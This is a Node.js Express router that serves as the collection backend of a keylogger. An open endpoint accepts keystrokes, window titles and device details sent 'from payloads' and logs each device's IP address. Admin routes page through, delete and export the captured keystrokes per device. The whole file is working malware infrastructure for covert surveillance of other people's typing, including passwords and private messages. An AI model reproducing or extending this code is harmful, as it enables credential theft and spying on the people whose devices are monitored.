const express = require('express');
const Device = require('../models/Device');
const Keystroke = require('../models/Keystroke');
const authMiddleware = require('../middleware/auth');

const router = express.Router();

// POST /api/keystrokes - Receive keystrokes from payloads (public endpoint)
router.post('/', async (req, res) => {
  try {
    const { deviceId, keys, application, windowTitle, deviceInfo, timestamp, isBulk, batchData } = req.body;

    if (!deviceId || !keys) {
      return res.status(400).json({ error: 'deviceId and keys required.' });
    }

    // Update or create device
    const deviceData = {
      $set: {
        lastSeen: new Date(),
        status: 'online',
        ip: req.ip || req.connection.remoteAddress || ''
      },
      $inc: { totalKeystrokes: 1 },
      $setOnInsert: {
        deviceId,
        type: deviceInfo?.type || 'web',
        name: deviceInfo?.name || deviceId,
        os: deviceInfo?.os || '',
        osVersion: deviceInfo?.osVersion || '',
        browser: deviceInfo?.browser || '',
        browserVersion: deviceInfo?.browserVersion || '',
        firstSeen: new Date()
      }
    };

    await Device.findOneAndUpdate({ deviceId }, deviceData, { upsert: true });

    // Save keystroke
    if (isBulk && batchData && Array.isArray(batchData)) {
      const keystrokes = batchData.map(item => ({
        deviceId,
        keys: item.keys,
        application: item.application || application || 'Unknown',
        windowTitle: item.windowTitle || windowTitle || '',
        timestamp: item.timestamp || new Date(),
        syncedAt: new Date(),
        isBulk: false,
        batchSize: 1
      }));

      await Keystroke.insertMany(keystrokes);
      await Device.findOneAndUpdate({ deviceId }, { $inc: { totalKeystrokes: keystrokes.length } });

      res.json({ success: true, count: keystrokes.length });
    } else {
      const keystroke = new Keystroke({
        deviceId,
        keys,
        application: application || 'Unknown',
        windowTitle: windowTitle || '',
        timestamp: timestamp || new Date(),
        syncedAt: new Date()
      });
      await keystroke.save();

      res.json({ success: true, id: keystroke._id });
    }
  } catch (err) {
    res.status(500).json({ error: 'Server error.' });
  }
});

// GET /api/keystrokes/:deviceId - Get keystrokes for a device (admin)
router.get('/:deviceId', authMiddleware, async (req, res) => {
  try {
    const { page = 1, limit = 100, from, to } = req.query;
    const query = { deviceId: req.params.deviceId };

    if (from || to) {
      query.timestamp = {};
      if (from) query.timestamp.$gte = new Date(from);
      if (to) query.timestamp.$lte = new Date(to);
    }

    const keystrokes = await Keystroke.find(query)
      .sort({ timestamp: -1 })
      .skip((page - 1) * limit)
      .limit(parseInt(limit));

    const total = await Keystroke.countDocuments(query);

    res.json({
      keystrokes,
      total,
      page: parseInt(page),
      pages: Math.ceil(total / limit)
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error.' });
  }
});

// DELETE /api/keystrokes/:deviceId - Clear keystrokes for a device
router.delete('/:deviceId', authMiddleware, async (req, res) => {
  try {
    await Keystroke.deleteMany({ deviceId: req.params.deviceId });
    await Device.findOneAndUpdate({ deviceId: req.params.deviceId }, { $set: { totalKeystrokes: 0 } });
    res.json({ message: 'Keystrokes cleared.' });
  } catch (err) {
    res.status(500).json({ error: 'Server error.' });
  }
});

// GET /api/keystrokes/export/:deviceId - Export keystrokes as text
router.get('/export/:deviceId', authMiddleware, async (req, res) => {
  try {
    const keystrokes = await Keystroke.find({ deviceId: req.params.deviceId })
      .sort({ timestamp: 1 })
      .limit(5000);

    const text = keystrokes.map(k => `[${k.timestamp.toISOString()}] [${k.application}] ${k.keys}`).join('\n');
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', `attachment; filename=keystrokes_${req.params.deviceId}.txt`);
    res.send(text);
  } catch (err) {
    res.status(500).json({ error: 'Server error.' });
  }
});

module.exports = router;

